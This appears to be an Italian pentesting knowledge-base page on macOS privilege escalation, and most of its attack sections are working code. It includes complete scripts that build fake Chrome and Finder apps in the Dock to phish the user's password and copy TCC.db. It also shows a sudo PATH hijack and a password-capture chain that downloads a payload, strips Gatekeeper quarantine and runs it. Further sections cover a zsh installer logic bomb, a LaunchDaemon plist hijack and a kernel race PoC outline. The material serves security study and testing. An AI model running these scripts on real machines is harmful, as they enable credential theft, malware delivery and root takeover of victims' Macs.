# Escalation dei privilegi su macOS

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Se stai cercando informazioni su TCC privilege escalation, vai a:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Nota che **la maggior parte dei trucchi di escalation dei privilegi che interessano Linux/Unix interesserà anche le macchine MacOS**. Consulta quindi:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interazione con l'utente

### Sudo Hijacking

Puoi trovare la tecnica originale [Sudo Hijacking all'interno dell'articolo Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Tuttavia, macOS **mantiene** il **`PATH`** dell'utente quando esegue **`sudo`**. Ciò significa che un altro modo per eseguire questo attacco sarebbe **hijackare altri binari** che la vittima eseguirà comunque quando **esegue sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Nota che un utente che utilizza il terminale molto probabilmente avrà **Homebrew installato**. È quindi possibile dirottare i binari in **`/opt/homebrew/bin`**.

### Impersonificazione del Dock

Utilizzando un po' di **social engineering**, potresti **impersonare, ad esempio, Google Chrome** all'interno del Dock ed eseguire effettivamente il tuo script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Alcuni suggerimenti:

- Controlla nel Dock se è presente Chrome e, in tal caso, **rimuovi** quella voce e **aggiungi** la voce di Chrome **fake** nella stessa posizione nell'array del Dock.

<details>
<summary>Script per l'impersonificazione di Chrome nel Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Alcuni suggerimenti:

- **Non puoi rimuovere Finder dal Dock**, quindi, se hai intenzione di aggiungerlo al Dock, puoi mettere il Finder fake proprio accanto a quello reale. Per farlo devi **aggiungere la voce del Finder fake all'inizio dell'array del Dock**.
- Un'altra opzione è non inserirlo nel Dock e aprirlo semplicemente: "Finder chiede di controllare Finder" non è poi così strano.
- Un'altra opzione per **escalare a root senza chiedere** la password mostrando una finestra orribile consiste nel fare in modo che Finder chieda realmente la password per eseguire un'azione privilegiata:
- Chiedi a Finder di copiare in **`/etc/pam.d`** un nuovo file **`sudo`**. Il prompt che chiede la password indicherà che "Finder vuole copiare sudo".
- Chiedi a Finder di copiare un nuovo **Authorization Plugin**. (Puoi controllare il nome del file, così il prompt che chiede la password indicherà che "Finder vuole copiare Finder.bundle".)

<details>
<summary>Script di impersonazione del Dock di Finder</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Phishing del prompt della password + riutilizzo di sudo

Il malware abusa frequentemente dell'interazione dell'utente per **catturare una password in grado di usare sudo** e riutilizzarla programmaticamente. Un flusso comune:

1. Identificare l'utente connesso con `whoami`.
2. **Ripetere i prompt della password** finché `dscl . -authonly "$user" "$pw"` non restituisce un esito positivo.
3. Memorizzare la credenziale (ad esempio, `/tmp/.pass`) ed eseguire azioni privilegiate con `sudo -S` (password tramite stdin).

Catena minima di esempio:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
La password rubata può quindi essere riutilizzata per **eliminare la quarantena di Gatekeeper con `xattr -c`**, copiare LaunchDaemons o altri file privilegiati ed eseguire ulteriori stage in modo non interattivo.<sup>[[1]](#references)</sup>

## Vettori specifici delle versioni più recenti di macOS (2023–2025)

### `AuthorizationExecuteWithPrivileges` deprecato ancora utilizzabile

`AuthorizationExecuteWithPrivileges` è stato deprecato nella versione 10.7, ma **funziona ancora su Sonoma/Sequoia**. Molti updater commerciali invocano `/usr/libexec/security_authtrampoline` con un percorso non attendibile. Se il binary target è scrivibile dall'utente, puoi piantare un trojan e sfruttare il prompt legittimo:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Combina con i **masquerading tricks sopra** per presentare una finestra di dialogo della password credibile.


### Triage di helper privilegiati / XPC

Molti privesc di terze parti moderni per macOS seguono lo stesso schema: un **LaunchDaemon root** espone un **servizio Mach/XPC** da **`/Library/PrivilegedHelperTools`**, quindi l'helper non valida il client, lo valida **troppo tardi** (race del PID) oppure espone un **metodo root** che utilizza un percorso/script **controllato dall'utente**. Questa è la classe di bug alla base di numerosi bug recenti negli helper dei client VPN, dei game launcher e degli updater.<sup>[[2]](#references)</sup>

Checklist di triage rapida:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Presta particolare attenzione agli helper che:

- continuano ad accettare richieste **dopo la disinstallazione** perché il job è rimasto caricato in `launchd`
- eseguono script o leggono configurazioni da **`/Applications/...`** o da altri percorsi scrivibili da utenti non-root
- si basano sulla validazione dei peer **basata sul PID** o **solo sul bundle-id**, che potrebbe essere soggetta a race condition

Per ulteriori dettagli sui bug di autorizzazione degli helper, consulta [questa pagina](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Ereditarietà dell'ambiente degli script di PackageKit (CVE-2024-27822)

Prima che Apple risolvesse il problema in **Sonoma 14.5**, **Ventura 13.6.7** e **Monterey 12.7.5**, le installazioni avviate dall'utente tramite **`Installer.app`** / **`PackageKit.framework`** potevano eseguire gli **script PKG come root all'interno dell'ambiente dell'utente corrente**. Ciò significa che un pacchetto che utilizzava **`#!/bin/zsh`** avrebbe caricato **`~/.zshenv`** dell'attaccante e lo avrebbe eseguito come **root** quando la vittima installava il pacchetto.<sup>[[3]](#references)</sup>

Questo è particolarmente interessante come **logic bomb**: è sufficiente avere un foothold nell'account dell'utente e un file di avvio della shell scrivibile, quindi attendere che l'utente esegua un installer **basato su zsh** vulnerabile. In generale, questo non si applica alle distribuzioni **MDM/Munki**, perché vengono eseguite all'interno dell'ambiente dell'utente root.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Se vuoi approfondire l'abuso specifico degli installer, consulta anche [questa pagina](macos-files-folders-and-binaries/macos-installers-abuse.md).

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Se un plist di LaunchDaemon o il relativo target `ProgramArguments` è **scrivibile dall'utente**, puoi eseguire un privilege escalation sostituendolo e forzando il reload di launchd:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
This rispecchia il pattern di exploit pubblicato per **CVE-2025-24085**, in cui un plist scrivibile veniva sfruttato per eseguire codice dell’attaccante come root.

### XNU SMR credential race (CVE-2025-24118)

Una **race in `kauth_cred_proc_update`** consente a un attaccante locale di corrompere il puntatore alle credenziali in sola lettura (`proc_ro.p_ucred`) eseguendo in parallelo loop di `setgid()`/`getgid()` tra più thread, fino a provocare una `memcpy` parziale. Una corruzione riuscita restituisce **uid 0** e l’accesso alla memoria del kernel. Struttura minima della PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Associatelo all’heap grooming per posizionare dati controllati nel punto in cui il puntatore viene riletto. Nelle build vulnerabili, ciò consente una **local kernel privesc** affidabile senza requisiti di bypass di SIP.<sup>[[4]](#references)</sup>

### Bypass di SIP tramite Migration assistant ("Migraine", CVE-2023-32369)

Se disponete già dei privilegi di root, SIP blocca comunque le scritture nelle posizioni di sistema. Il bug **Migraine** abusa dell’entitlement di Migration Assistant `com.apple.rootless.install.heritable` per avviare un processo figlio che eredita il bypass di SIP e sovrascrive percorsi protetti (ad esempio `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> La catena è la seguente:

1. Ottenere i privilegi di root su un sistema attivo.
2. Attivare `systemmigrationd` con uno stato appositamente elaborato per eseguire un binary controllato dall’attaccante.
3. Usare l’entitlement ereditato per modificare i file protetti da SIP, mantenendo la persistenza anche dopo il reboot.

### NSPredicate/XPC expression smuggling (classe di bug CVE-2023-23530/23531)

Diversi daemon Apple accettano oggetti **NSPredicate** tramite XPC e validano solo il campo `expressionType`, controllabile dall’attaccante. Creando un predicate che valuta selector arbitrari, è possibile ottenere **code execution nei servizi XPC root/system** (ad esempio `coreduetd`, `contextstored`). Se combinato con un iniziale app sandbox escape, ciò garantisce una **privilege escalation senza richieste all’utente**. Cercate endpoint XPC che deserializzano predicate e non dispongono di un visitor robusto.<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Qualsiasi utente** (anche non privilegiato) può creare e montare uno snapshot di Time Machine con `-o noowners` e **accedere a TUTTI i file** di quello snapshot, aggirando i controlli di ownership sul volume attivo. L’unico privilegio necessario è che l’applicazione utilizzata (come `Terminal`) disponga di **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

I comandi e la spiegazione completa sono disponibili nella pagina sui TCC bypass:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Informazioni sensibili

Questo può essere utile per effettuare una privilege escalation:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Riferimenti

- [1] [Pentest Partners - 2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - A New Privilege Escalation Bug Class on macOS and iOS (CVE-2023-23530/23531)](https://www.trellix.com/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)

{{#include ../../banners/hacktricks-training.md}}
